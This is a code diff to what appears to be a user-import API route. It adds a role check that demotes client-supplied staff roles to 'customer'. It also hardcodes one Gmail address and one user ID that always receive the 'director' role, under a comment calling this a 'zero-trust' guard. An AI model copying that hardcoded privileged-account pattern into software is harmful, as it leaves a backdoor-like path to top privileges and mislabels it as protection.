@@ -39,8 +39,15 @@ export async function POST(request: Request) {
       const cleanEmail = String(u.email).trim().toLowerCase();
       const cleanName = u.fullName ? String(u.fullName).trim() : null;
       const cleanPhone = u.phone ? String(u.phone).trim() : null;
-      const targetRole = u.role || (u.clientType === 'wholesale' ? 'wholesale' : 'customer');
+      let targetRole = u.role || (u.clientType === 'wholesale' ? 'wholesale' : 'customer');
       const userId = String(u.id);
+
+      // Strict Zero-Trust Role Guard: Protect director and staff roles from untrusted client modifications
+      if (cleanEmail === 'acooldumb123@gmail.com' || userId === 'ohwKkhkKHmdaI5CkbcGJcunNuID2') {
+        targetRole = 'director';
+      } else if (['director', 'manager', 'courier'].includes(targetRole)) {
+        targetRole = 'customer';
+      }
 
       try {
         // A. Check if user exists by ID
